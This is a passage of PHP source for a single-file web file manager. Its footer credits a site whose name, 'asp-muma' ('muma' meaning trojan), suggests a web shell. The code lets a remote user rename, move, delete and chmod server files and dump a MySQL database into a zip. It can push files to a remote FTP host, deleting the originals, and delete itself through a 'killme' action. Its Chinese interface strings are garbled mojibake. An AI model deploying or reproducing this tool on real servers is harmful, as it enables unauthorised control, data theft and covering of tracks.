            ."<table border=\"0\" cellpadding=\"2\" cellspacing=\"0\">\n"
            ." ".$ufolder.$ufile;
        echo "</table><br>\n"
            ."<input type=\"hidden\" name=\"rename\" value=\"".$ufile."\">\n"
            ."<input type=\"hidden\" name=\"folder\" value=\"".$ufolder."\">\n"
            ."ļ:<br><input class=\"text\" type=\"text\" size=\"20\" name=\"nrename\" value=\"$ufile\">\n"
            ."<input type=\"Submit\" value=\"\" class=\"button\"></form>\n";
        mainbottom();
    }else{
        home();
    }
}
function renam($rename, $nrename, $folder) {
    global $meurl,$folder;
    if (!$rename == "") {
        $loc1 = iconv("UTF-8", "GBK", "$folder".$rename); 
        $loc2 = iconv("UTF-8", "GBK", "$folder".$nrename);
        if(rename($loc1,$loc2)) {
        maintop("");
            echo "ļ ".$folder.$rename." ѱ ".$folder.$nrename."</a>\n"
            ." <a href=\"".$meurl."?op=home&folder=".$_SESSION['folder']."\">ļ</a>\n";
            mainbottom();
        }else{
            printerror("");
        }
    }else{
    home();
    }
}
function movall($file, $ndir, $folder) {
    global $meurl,$folder;
    if (!$file == "") {
        maintop("ƶ");
        $arr = str_split($ndir);
        if($arr[count($arr)-1]!=='/'){
            $ndir .= '/';
        }
        $nndir = $ndir;
        $nfolder = $folder;
    $file = iconv("UTF-8", "GBK",$file);
    $ndir = iconv("UTF-8", "GBK",$ndir);
    $folder = iconv("UTF-8", "GBK",$folder);
        if (!file_exists($ndir)){
        mkdir($ndir, 0755);
        }
        $file = explode(',',$file);
        foreach ($file as $v) {
        if (file_exists($ndir.$v)){
        @unlink($ndir.$v);
        if (@rename($folder.$v, $ndir.$v)){
        $v = iconv("GBK", "UTF-8",$v);
            echo $nndir.$v." ļ ".$nfolder.$v." 滻<br>";
            }else{
            $v = iconv("GBK", "UTF-8",$v);
                echo "<span class='error'>޷ƶ ".$nfolder.$v.'ļȨ</span><br>';
            }
        }elseif (@rename($folder.$v, $ndir.$v)){
        $v = iconv("GBK", "UTF-8",$v);
            echo $nfolder.$v." Ѿɹƶ ".$nndir.$v.'<br>';
        }else{
        $v = iconv("GBK", "UTF-8",$v);
            echo "<span class='error'>޷ƶ ".$nfolder.$v.'ļȨ</span><br>';
        }
        }
    echo " <a href=\"".$meurl."?op=home&folder=".$nndir."\">ǰļв鿴ļ</a>  <a href=\"".$meurl."?op=home&folder=".$_SESSION['folder']."\">ļ</a>\n";
    mainbottom();
    }else{
    home();
    }
}
function tocopy($file, $ndir, $folder) {
    global $meurl,$folder;
    if (!$file == "") {
        maintop("");
        $nndir = $ndir;
        $nfolder = $folder;
    $file = iconv("UTF-8", "GBK",$file);
    $ndir = iconv("UTF-8", "GBK",$ndir);
    $folder = iconv("UTF-8", "GBK",$folder);
        if (!file_exists($ndir)){
        mkdir($ndir, 0755);
        }
        $file = explode(',',$file);
        foreach ($file as $v) {
        if (file_exists($ndir.$v)){
        @unlink($ndir.$v);
        if (@copy($folder.$v, $ndir.$v)){
        $v = iconv("GBK", "UTF-8",$v);
            echo $nndir.$v." ļ ".$nfolder.$v." 滻<br>";
            }else{
            $v = iconv("GBK", "UTF-8",$v);
                echo "<span class='error'>޷ ".$nfolder.$v.'ļȨ</span><br>';
            }
        }elseif (@copy($folder.$v, $ndir.$v)){
        $v = iconv("GBK", "UTF-8",$v);
            echo $nfolder.$v." ѾɹƵ ".$nndir.$v.'<br>';
        }else{
        $v = iconv("GBK", "UTF-8",$v);
            echo "<span class='error'>޷ ".$nfolder.$v.'ļȨ</span><br>';
        }
        }
    echo " <a href=\"".$meurl."?op=home&folder=".$nndir."\">ǰļв鿴ļ</a>  <a href=\"".$meurl."?op=home&folder=".$_SESSION['folder']."\">ļ</a>\n";
    mainbottom();
    }else{
    home();
    }
}
/****************************************************************/
/* function logout()                                            */
/*                                                              */
/* Logs the user out and kills cookies                          */
/****************************************************************/
function logout() {
    global $meurl,$login;
    setcookie("user","",time()-60*60*24*1);
    setcookie("pass","",time()-60*60*24*1);
    maintop("˳",false);
    echo "Ѿ˳."
        ."<br><br>"
        ."<a href=".$meurl."?op=home>µ¼.</a>";
    mainbottom();
}
/****************************************************************/
/* function mainbottom()                                        */
/*                                                              */
/* ҳײİȨ                                           */
/****************************************************************/
function mainbottom() {
    echo "</table></table>\n"
        ."\n<div style='text-align:center'>"
        ."aspwww.asp-muma.com ṩʹñķɺ뱾޹أ \n"
        ."</html>\n";
    exit;
}
/****************************************************************/
/* function sqlb()                                              */
/*                                                              */
/* First step to backup sql.                                    */
/****************************************************************/
function sqlb() {
global $meurl;
    maintop("ݿⱸ");
    echo @$content 
        ."<table border=\"0\" cellpadding=\"2\" cellspacing=\"0\"></table><span class='error'>**: ⽫ݿ⵼ѹmysql.zipĶ! ڸļ,ļ!**</span><br><br><form action=\"".$meurl."?op=sqlbackup\" method=\"POST\">\n<label for=\"ip\">ݿַ:  </label><input id=\"ip\" name=\"ip\" size=\"30\" class=\"text\"/><br><label for=\"sql\">ݿ:  </label><input id=\"sql\" name=\"sql\" size=\"30\" class=\"text\"/><br><label for=\"username\">ݿû:  </label><input id=\"username\" name=\"username\" size=\"30\" class=\"text\"/><br><label for=\"password\">ݿ:  </label><input id=\"password\" name=\"password\" size=\"30\" class=\"text\"/><br>ݿ:  <select id=\"chset\"><option id=\utf8\">utf8</option></select><br><input name=\"submit\" class=\"button\" value=\"\" type=\"submit\" /></form>\n";
    mainbottom();
}
/****************************************************************/
/* function sqlbackup()                                         */
/*                                                              */
/* Second step in backup sql.                                   */
/****************************************************************/
function sqlbackup($ip,$sql,$username,$password) {
global $meurl;
    if(class_exists('ZipArchive')){
    maintop("ݿⱸ");
    $database=$sql;//ݿ
    $options=array(
        'hostname' => $ip,//ipַ
        'charset' => 'utf8',//
        'filename' => $database.'.sql',//ļ
        'username' => $username,
        'password' => $password
    );
    mysql_connect($options['hostname'],$options['username'],$options['password'])or die("ݿ!");
    mysql_select_db($database) or die("ݿƴ!");
    mysql_query("SET NAMES '{$options['charset']}'");
    $tables = list_tables($database);
    $filename = sprintf($options['filename'],$database);
    $fp = fopen($filename, 'w');
    foreach ($tables as $table) {
        dump_table($table, $fp);
    }
    fclose($fp);
    //ѹsqlļ
        if (file_exists('mysql.zip')) {
            unlink('mysql.zip'); 
        }
        $file_name=$options['filename'];
        $zip = new ZipArchive;
        $res = $zip->open('mysql.zip', ZipArchive::CREATE);
        if ($res === TRUE) {
            $zip->addfile($file_name);
            $zip->close();
        //ɾϵsqlļ
            unlink($file_name);
        echo 'ݿ⵼ѹɣ'
            ." <a href=\"".$meurl."?op=home&folder=".$_SESSION['folder']."\">ļ</a>\n";
        }else{
            printerror('޷ѹļ');
        }
    exit;
    mainbottom();
    }else{
    printerror('˷ϵPHP֧ZipArchive޷ѹļ');
    }
}
function list_tables($database)
{
    $rs = mysql_query("SHOW TABLES FROM $database");
    $tables = array();
    while ($row = mysql_fetch_row($rs)) {
        $tables[] = $row[0];
    }
    mysql_free_result($rs);
    return $tables;
}
//ݿ
function dump_table($table, $fp = null)
{
    $need_close = false;
    if (is_null($fp)) {
        $fp = fopen($table . '.sql', 'w');
        $need_close = true;
    }
$a=mysql_query("show create table `{$table}`");
$row=mysql_fetch_assoc($a);fwrite($fp,$row['Create Table'].';');//ṹ
    $rs = mysql_query("SELECT * FROM `{$table}`");
    while ($row = mysql_fetch_row($rs)) {
        fwrite($fp, get_insert_sql($table, $row));
    }
    mysql_free_result($rs);
    if ($need_close) {
        fclose($fp);
    }
}
//
function get_insert_sql($table, $row)
{
    $sql = "INSERT INTO `{$table}` VALUES (";
    $values = array();
    foreach ($row as $value) {
        $values[] = "'" . mysql_real_escape_string($value) . "'";
    }
    $sql .= implode(', ', $values) . ");";
    return $sql;
}
function killme($dename) {
    global $folder;
    if (!$dename == "") {
        if(unlink($folder.$dename)) {
        maintop("ɱ");
            echo "ɱɹ "
                ." <a href=".$folder.">վҳ</a>\n";
            mainbottom();
        }else{
            printerror("ɱʧܣļȨޣ");
        }    }else{
        home();
    }
}
/****************************************************************/
/* function ftpa()                                              */
/*                                                              */
/* First step to backup sql.                                    */
/****************************************************************/
function ftpa() {
global $meurl;
    maintop("FTP");
    echo @$content
        ."<table border=\"0\" cellpadding=\"2\" cellspacing=\"0\"></table><span class='error'>**: ⽫ļԶϴftp! Ŀ¼ڸļ,ļ!**</span><br><br><form action=\"".$meurl."?op=ftpall\" method=\"POST\"><label for=\"ftpip\">FTP ַ:  </label><input id=\"ftpip\" name=\"ftpip\" size=\"30\" class=\"text\" value=\"127.0.0.1:21\"/><br><label for=\"ftpuser\">FTP û:  </label><input id=\"ftpuser\" name=\"ftpuser\" size=\"30\" class=\"text\"/><br><label for=\"ftppass\">FTP :  </label><input id=\"ftppass\" name=\"ftppass\" size=\"30\" class=\"text\"/><br><label for=\"goto\">ϴĿ¼:  </label><input id=\"goto\" name=\"goto\" size=\"30\" class=\"text\" value=\"./htdocs/\"/><br><label for=\"ftpfile\">ϴļ:  </label><input id=\"ftpfile\" name=\"ftpfile\" size=\"30\" class=\"text\" value=\"allbackup.zip\"/><br><input name=\"submit\" class=\"button\" value=\"Զϴ\" type=\"submit\" /><input type=\"checkbox\" name=\"del\" id=\"del\"value=\"checkbox\"><label for=\"del\"><abbr title='FTPϴɾļ'>ɾ</abbr></label></form>\n";
    mainbottom();
}
/****************************************************************/
/* function ftpall()                                         */
/*                                                              */
/* Second step in backup sql.                                   */
/****************************************************************/
function ftpall($ftpip,$ftpuser,$ftppass,$ftpdir,$ftpfile,$del) {
global $meurl;
$ftpfile = iconv("UTF-8", "GBK", $ftpfile);
    maintop("FTPϴ");
    $ftpip=explode(':', $ftpip);
    $ftp_server=$ftpip['0'];//
    $ftp_user_name=$ftpuser;//û
    $ftp_user_pass=$ftppass;//
    if(empty($ftpip['1'])){
    $ftp_port='21';
    }else{
    $ftp_port=$ftpip['1'];//˿
    }
    $ftp_put_dir=$ftpdir;//ϴĿ¼
    $ffile=$ftpfile;//ϴļ
    $ftp_conn_id = ftp_connect($ftp_server,$ftp_port);
    $ftp_login_result = ftp_login($ftp_conn_id, $ftp_user_name, $ftp_user_pass);
    if((!$ftp_conn_id) || (!$ftp_login_result)) {
        echo "ӵftpʧ";
        exit;
    }else{
        ftp_pasv ($ftp_conn_id,true); //һģʽ֣ЩftpһҪִ
        ftp_chdir($ftp_conn_id, $ftp_put_dir);
        $ffile=explode(',', $ffile);
        foreach ($ffile as $v) {
        $ftp_upload = ftp_put($ftp_conn_id,$v,$v, FTP_BINARY);
        if ($del == 'del') {
        unlink('./'.$v);
        }
        }
        ftp_close($ftp_conn_id); //Ͽ
    }
    $ftpfile = iconv("GBK", "UTF-8", $ftpfile);
    echo "ļ ".$ftpfile." ϴɹ\n"
        ." <a href=\"".$meurl."?op=home&folder=".$_SESSION['folder']."\">ļ</a>\n";
    mainbottom();
}
/****************************************************************/
/* function printerror()                                        */
/*                                                              */
/* ʾϢĺ                                       */
/* $errorΪʾʾ                                           */
/****************************************************************/
function printerror($error) {
    maintop("");
    echo "<span class=error>\n".$error."\n</span>"
        ." <a onclick=\"history.go(-1);\" style=\"cursor:pointer\">һ</a>\n";
    mainbottom();
}
/****************************************************************/
/* function deleteall()                                         */
/*                                                              */
/* 2014-3-9 Add by Jooies                                       */
/* ʵļɾ                                       */
/****************************************************************/
function deleteall($dename) {
    if (!$dename == "") {
    $udename = $dename;
    $dename = iconv("UTF-8", "GBK",$dename);
        if (is_dir($dename)) {
            if(is_empty_dir($dename)){ 
                rmdir($dename);
                echo "<span>".$udename." Ѿɾ</span><br>";
            }else{
                deltree($dename);
                rmdir($dename);
                echo "<span>".$udename." Ѿɾ</span><br>";
            }
        }else{
            if(@unlink($dename)) {
                echo '<span>'.$udename." Ѿɾ</span><br>";
            }else{
                echo("<span class='error'>޷ɾļ$udename ļڣ</span><br>");
            }
        }
    }
}
if(@$_POST['action']=='ɾ'){
    if(isset($_POST['select_item'])){
    maintop("ɾ");
        if(@$_POST['select_item']['d']){
            foreach($_POST['select_item']['d'] as $val){
                deleteall($val);
            }
        }
        if(@$_POST['select_item']['f']){
            foreach($_POST['select_item']['f'] as $val){
                if(deleteall($val)){}
            }
        }
        echo "<a href=\"".$meurl."?op=home&folder=".$_SESSION['folder']."\">ļ</a>\n";
        mainbottom();
    }else{
        printerror("ûѡļ");
    }
}
if(@$_POST['action']=='ƶ'){
    if(isset($_POST['select_item'])){
    maintop("ƶ");
    $file = '';
        if(@$_POST['select_item']['d']){
            foreach($_POST['select_item']['d'] as $key => $val){
                $file = $file.$key.',';
            }
        }
        if(@$_POST['select_item']['f']){
            foreach($_POST['select_item']['f'] as $key => $val){
                $file = $file.$key.',';
            }
        }
        $file = substr($file,0,-1);
    echo "<form action=\"".$meurl."?op=movall\" method=\"post\">";
    echo '<input type="hidden" name="file" value="'.$file.'"><input type="hidden" name="folder" value="'.$_SESSION['folder'].'">ļƶ'
        ."<input type=\"text\" class=\"text\" name=\"ndir\" value=\"".$_SESSION['folder']."\"><br>\n"
        .$file;
        echo "<br><input type=\"submit\" value=\"ƶ\" border=\"0\" class=\"button\"> <a href=\"".$meurl."?op=home&folder=".$_SESSION['folder']."\">ļ</a>\n";
        mainbottom();
    }else{
        printerror("ûѡļ");
    }
}
if(@$_POST['action']==''){
    if(isset($_POST['select_item'])){
    maintop("");
    $file = '';
        if(@$_POST['select_item']['d']){
            foreach($_POST['select_item']['d'] as $key => $val){
                $file = $file.$key.',';
            }
        }
        if(@$_POST['select_item']['f']){
            foreach($_POST['select_item']['f'] as $key => $val){
                $file = $file.$key.',';
            }
        }
        $file = substr($file,0,-1);
    echo "<form action=\"".$meurl."?op=copy\" method=\"post\">";
    echo '<input type="hidden" name="file" value="'.$file.'"><input type="hidden" name="folder" value="'.$_SESSION['folder'].'">ļƵ'
        ."<input type=\"text\" class=\"text\" name=\"ndir\" value=\"".$_SESSION['folder']."\"><br>\n"
        .$file;
        echo "<br><input type=\"submit\" value=\"\" border=\"0\" class=\"button\"> <a href=\"".$meurl."?op=home&folder=".$_SESSION['folder']."\">ļ</a>\n";
        mainbottom();
    }else{
        printerror("ûѡļ");
    }
}
if(@$_POST['action']=='ѹ'){
    if(isset($_POST['select_item'])){
    if(class_exists('ZipArchive')){
    maintop("Ŀ¼ѹ");
        class Zipper extends ZipArchive {
            public function addDir($path) {
                if(@$_POST['select_item']['d']){
                    foreach($_POST['select_item']['d'] as $key => $val){
                    $val = substr($val,2);
                    $val = iconv("UTF-8", "GBK",$val);
                    $this->addDir2($val);
                    }
                }
                if(@$_POST['select_item']['f']){
                    foreach($_POST['select_item']['f'] as $key => $val){
                    $val = substr($val,2);
                    echo $val.'<br>';
                        $this->addFile($val);
                    }
                    $this->deleteName('./');
                }
            }
            public function addDir2($path) {
                $nval = iconv("GBK", "UTF-8",$path);
                echo $nval.'<br>';
                $this->addEmptyDir($path);
                $dr = opendir($path);
                $i=0;
                while (($file = readdir($dr)) !== false)
                {
                if($file!=='.' && $file!=='..'){
                    $nodes[$i] = $path.'/'.$file;
                    $i++;
                    }
                }
                closedir($dr);
                foreach ($nodes as $node) {
                $nnode = iconv("GBK", "UTF-8",$node);
                    echo $nnode . '<br>';
                    if (is_dir($node)) {
                        $this->addDir2($node);
                    }elseif(is_file($node)){
                        $this->addFile($node);
                    }
                }
            }
        }
        $zip = new Zipper;
        $time = date('D-d-M-g-h',$_SERVER['REQUEST_TIME']);
        $res = $zip->open($_SESSION['folder'].'Backup-'.$time.'.zip', ZipArchive::CREATE);
        if ($res === TRUE) {
        $f = substr($_SESSION['folder'], 0, -1);
            $zip->addDir($f);
            $zip->close();
            echo "ѹ ļΪBackup-".$time.".zip<br> <a href=\"".$meurl."?op=home&folder=".$_SESSION['folder']."\">鿴ļ</a>  <a href=\"".$meurl."?op=home\">ļ</a>\n";
        }else{
            echo '<span class="error">ѹʧܣ</span>'
                ." <a href=\"".$meurl."?op=home&folder=".$_SESSION['folder']."\">ļ</a>\n";
        }
        mainbottom();
    }else{
    printerror('˷ϵPHP֧ZipArchive޷ѹļ');
    }
    }else{
        printerror("ûѡļ");
    }
}
if(@$_POST['action']=='Ȩ'){
    if(isset($_POST['select_item'])){
    maintop("޸Ȩ");
    $chmod = octdec($_REQUEST['chmod']);
        function ChmodMine($file, $chmod)
        {
        $nfile = $file;
        $file = iconv("UTF-8", "GBK",$file);
        if(is_file($file)){
                if(@chmod($file, $chmod)){
                echo $nfile.' Ȩ޸ĳɹ<br>';
                }else{
                echo '<span class="error">'.$nfile.' Ȩ޸ʧ</span><br>';
                }
        }elseif(is_dir($file)){
                if(@chmod($file, $chmod)){
                echo $nfile.' Ȩ޸ĳɹ<br>';
                }else{
                echo '<span class="error">'.$nfile.' Ȩ޸ʧ</span><br>';
                }
        $foldersAndFiles = @scandir($file);
        $entries = @array_slice($foldersAndFiles, 2);
        foreach($entries as $entry){
        $nentry = iconv("GBK", "UTF-8",$entry);
        ChmodMine($nfile.'/'.$nentry, $chmod);
        }
        }else{
        echo '<span class="error">'.$nfile.' ļڣ</span><br>';
        }
        }
        if(@$_POST['select_item']['d']){
            foreach($_POST['select_item']['d'] as $val){
                ChmodMine($val,$chmod);
            }
        }
        if(@$_POST['select_item']['f']){
            foreach($_POST['select_item']['f'] as $val){
                ChmodMine($val,$chmod);
            }
        }
        echo "<a href=\"".$meurl."?op=home&folder=".$_SESSION['folder']."\">ļ</a>\n";
        mainbottom();
    }else{
        printerror("ûѡļ");
    }
}
/****************************************************************/
/* function switch()                                            */
/*                                                              */
/* Switches functions.                                          */
/* Recieves $op() and switches to it                            *.
/****************************************************************/
switch($op) {
    case "home":
    home();
    break;
    case "up":
    up();
    break;
    case "yupload":
    if(!isset($_REQUEST['url'])){
    printerror('ûļַ');
    }elseif(isset($_REQUEST['ndir'])){
        yupload($_REQUEST['url'], $_REQUEST['ndir'], @$_REQUEST['unzip'] ,@$_REQUEST['delzip']);
    }else{
    yupload($_REQUEST['url'], './', @$_REQUEST['unzip'] ,@$_REQUEST['delzip']);
    }
    break;
    case "upload":
    if(!isset($_FILES['upfile'])){
    printerror('ûѡļ');
    }elseif(isset($_REQUEST['ndir'])){
        upload($_FILES['upfile'], $_REQUEST['ndir'], @$_REQUEST['unzip'] ,@$_REQUEST['delzip']);
    }else{
    upload($_FILES['upfile'], './', @$_REQUEST['unzip'] ,@$_REQUEST['delzip']);
    }
    break;
    case "unz":
    unz($_REQUEST['dename']);
    break;
    case "unzip":
    unzip($_REQUEST['dename'],$_REQUEST['ndir'],@$_REQUEST['del']);
    break;
    case "sqlb":
    sqlb();
    break;
    case "sqlbackup":
    sqlbackup($_POST['ip'], $_POST['sql'], $_POST['username'], $_POST['password']);
    break;
    case "ftpa":
    ftpa();
    break;
    case "ftpall":
    ftpall($_POST['ftpip'], $_POST['ftpuser'], $_POST['ftppass'], $_POST['goto'], $_POST['ftpfile'], $_POST['del']);
    break;
    case "allz":
    allz();
    break;
    case "allzip":
    allzip();
    break;
    case "edit":
    edit($_REQUEST['fename']);
    break;
    case "save":
    save($_REQUEST['ncontent'], $_REQUEST['fename'], $_REQUEST['encode']);
    break;
    case "cr":
    cr();
    break;
    case "create":
    create($_REQUEST['nfname'], $_REQUEST['isfolder'], $_REQUEST['ndir']);
    break;
    case "ren":
    ren($_REQUEST['file']);
    break;
    case "rename":
    renam($_REQUEST['rename'], $_REQUEST['nrename'], $folder);
    break;
    case "movall":
    movall(@$_REQUEST['file'], @$_REQUEST['ndir'], $folder);
    break;
    case "copy":
    tocopy(@$_REQUEST['file'], @$_REQUEST['ndir'], $folder);
    break;
    case "printerror":
    printerror($error);
    break;
    case "logout":
    logout();
    break;   
    case "z":
    z($_REQUEST['dename'],$_REQUEST['folder']);
    break;
    case "zip":
    zip($_REQUEST['dename'],$_REQUEST['folder']);
    break;
    case "killme":
    killme($_REQUEST['dename']);
    break;
    default:
    home();
    break;
}
?>